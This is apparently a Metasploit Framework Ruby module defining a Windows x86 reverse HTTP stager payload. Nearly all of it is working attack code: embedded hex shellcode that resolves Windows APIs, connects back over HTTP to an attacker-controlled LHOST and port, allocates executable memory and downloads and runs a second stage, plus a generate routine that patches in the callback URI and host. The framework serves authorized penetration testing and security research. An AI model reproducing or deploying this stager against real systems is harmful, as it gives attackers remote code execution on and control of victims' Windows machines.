##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_http'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse HTTP Stager',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Convention'    => 'sockedi http',
      'Stager'        =>
        {
          'Offsets' =>
            {
              # Disabled since it MUST be ExitProcess to work on WoW64 unless we add EXITFUNK support (too big right now)
              # 'EXITFUNC' => [ 290, 'V' ],
              'LPORT'    => [ 184, 'v' ], # Not a typo, really little endian
            },
          'Payload' =>

            # Built on Mon Jan 27 11:38:26 2014
            # Name: stager_reverse_http
            # Length: 324 bytes
            # LEPort Offset: 184
            # ExitFunk Offset: 245
            "\xFC\xE8\x86\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
            "\x8B\x52\x10\x8B\x42\x3C\x8B\x4C\x10\x78\xE3\x4A\x01\xD1\x51\x8B" +
            "\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3C\x49\x8B\x34\x8B\x01\xD6\x31" +
            "\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8" +
            "\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B" +
            "\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61" +
            "\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x89\x5D\x68\x6E\x65" +
            "\x74\x00\x68\x77\x69\x6E\x69\x54\x68\x4C\x77\x26\x07\xFF\xD5\x31" +
            "\xFF\x57\x57\x57\x57\x6A\x00\x54\x68\x3A\x56\x79\xA7\xFF\xD5\x31" +
            "\xC9\x51\x51\x6A\x03\x51\x51\x68\x5C\x11\x00\x00\xEB\x3D\x50\x68" +
            "\x57\x89\x9F\xC6\xFF\xD5\x31\xD2\x52\x68\x00\x02\x60\x84\x52\x52" +
            "\x52\xEB\x2A\x52\x50\x68\xEB\x55\x2E\x3B\xFF\xD5\x96\x6A\x10\x59" +
            "\x31\xFF\x57\x57\x57\x57\x56\x68\x2D\x06\x18\x7B\xFF\xD5\x85\xC0" +
            "\x75\x17\xE0\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\xEB\x42\xE8\xD1\xFF" +
            "\xFF\xFF\x2F\x31\x32\x33\x34\x35\x00\x6A\x40\x68\x00\x10\x00\x00" +
            "\x68\x00\x00\x40\x00\x57\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x53" +
            "\x89\xE7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xE2\xFF" +
            "\xD5\x85\xC0\x74\xBF\x8B\x07\x01\xC3\x85\xC0\x75\xE5\x58\xC3\xE8" +
            "\x7A\xFF\xFF\xFF"

        }
      ))
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Generate the first stage
  #
  def generate
    p = super
    i = p.index("/12345\x00")
    u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW) + "\x00"
    p[i, u.length] = u
    p + datastore['LHOST'].to_s + "\x00"
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
